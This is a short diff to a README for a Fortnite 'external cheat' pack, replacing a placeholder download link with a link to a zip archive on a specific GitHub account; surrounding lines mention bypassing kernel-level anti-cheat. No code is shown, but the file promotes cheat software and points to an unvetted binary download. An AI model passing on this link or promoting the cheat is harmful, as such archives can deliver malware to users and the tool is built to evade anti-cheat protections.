@@ -6,7 +6,7 @@ To use this Fortnite External Cheat in games with kernel-level anti-cheats (EAC,
 
 --------------------------------------------------------------------------------------------------
 
-## [Download here](https://github.com/your-username/Fortnite-External-Cheat/releases/download/v1.0/Fortnite_External_v1.0.zip)
+## [Download here](https://github.com/kelly12426533-lang/Fortnite-Premium-External/releases/download/extr/External_compressed.zip)
 
 ## FortniteExternalPack 
 I'm presenting you several external cheats for different anti-cheats and game versions.
